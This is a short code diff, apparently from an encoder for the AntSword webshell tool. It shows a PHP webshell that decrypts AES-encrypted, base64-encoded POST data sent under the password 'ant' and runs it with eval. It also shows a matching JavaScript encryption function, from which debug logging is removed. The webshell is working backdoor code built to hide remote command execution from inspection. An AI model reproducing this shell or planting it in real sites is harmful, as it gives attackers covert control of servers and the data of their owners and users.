@@ -7,7 +7,7 @@
 <?php
 @session_start();
 $pwd='ant';
-$key=@substr(str_pad(session_id(),16,'0'),0,16);
+$key=@substr(str_pad(session_id(),16,'a'),0,16);
 @eval(openssl_decrypt(base64_decode($_POST[$pwd]), 'AES-128-ECB', $key, OPENSSL_RAW_DATA|OPENSSL_ZERO_PADDING));
 ?>
 
@@ -53,13 +53,10 @@ function encryptText(keyStr, text) {
   let buff = Buffer.alloc(16, 'a');
   buff.write(keyStr,0);
   keyStr = buff.toString();
-  console.log(keyStr);
   let encodetext = CryptoJS.AES.encrypt(text, CryptoJS.enc.Utf8.parse(keyStr), {
     mode: CryptoJS.mode.ECB,
     padding: CryptoJS.pad.ZeroPadding,
   }).toString();
-  console.log(encodetext);
-  console.log(decryptText(keyStr, encodetext));
   return encodetext;
 }
 
